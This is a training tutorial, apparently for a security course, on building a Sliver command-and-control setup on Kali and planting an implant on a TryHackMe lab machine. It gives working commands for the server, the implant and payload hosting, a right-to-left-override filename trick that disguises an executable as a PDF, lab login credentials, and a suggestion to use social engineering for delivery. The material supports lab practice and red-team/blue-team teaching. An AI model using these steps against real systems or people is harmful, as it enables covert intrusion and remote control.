# sliver C2 platform and Kali

## Pieces of a typical Command and Control attack
There are three pieces to a typical C2 setup:
1. A server which accepts incoming connections from a compromised machine.
2. A client that the threat actor uses to connect, through the C2 server, to the compromised machine.
3. The implant or beacon which is run on the compromised machine.

Let's start building our C2 system.

On Kali, first do:
```sudo apt install sliver```

Next, make sure your networking is in place. For instance, if you are connecting to a host over a VPN do that now and then execute:

```ip a```

and record the relevant ip address.

Finally, let's make a directory like ```sliver``` and then ```cd``` into it.

### 1. Starting up the sliver server

For piece 1, we start the server and then craft the exploit so that it knows to call home to this.
```sliver-server```

### 2. Start an http server as your C2 server
```http```

This should bind to port 80. If not, change the port as needed.

### 3. Create an implant
We need to create an implant that phones home to our server. 

```
generate -b http://10.6.1.70
```

Then execute 

```implants``` 

to ensure that the implant is created and pointing to the correct server. Note the ```Name``` of the implant.

### 4. Get the implant to the user

In pentesting, this is where you need to get creative and do a bit of social engineering to encourage the user to download and execute this file. It could be via email, messaging, etc. 

For the sake of this demo, open a shell and find where your implant is located. Execute:

```python3 -m http.server``` 

to start a web server which can serve this implant. It is likely running at port 8000.

```document\u202Efdp.exe```

### 5. DEMO: Using THM's Box
We used the ```Blue``` box to learn about RCE's and metasploit. Let's also try it here.

Start ```Blue``` on THM and record the IP address of the box.

Remote desktop into the machine using:

```rdesktop IP_ADDRESS```

Log in as ```Jon``` with ```alqfna22``` as a password. (How did you get this?)

Open a web browser and connect back to your Kali box at port, something like
```http://10.6.1.70:8000```

Find the implant. Download it and run it. pwned!

### 6. Watch for connections on your C2 server.

If this all works, you should see a new session on the sliver-server. Type

```use``` to start working with this session.

Do commands like ```ls``` and ```whoami``` from the prompt.

Try taking a screen shot of the machine. 

Can you get the flags from this machine this way?

### 7. What is next?

#### RED TEAM: 
* How would you get this payload to the user? What tactics would you use? 
* What challenges do you think you will need to overcome?
* You've just scored your first implant inside the corporate IT network. What is your plan of attack from here?


#### BLUE TEAM: 

* How do you prevent C2 implants?
* How do you detect C2 implants?
* How do protect against the next move of the red team after successfully scoring a C2 implant?


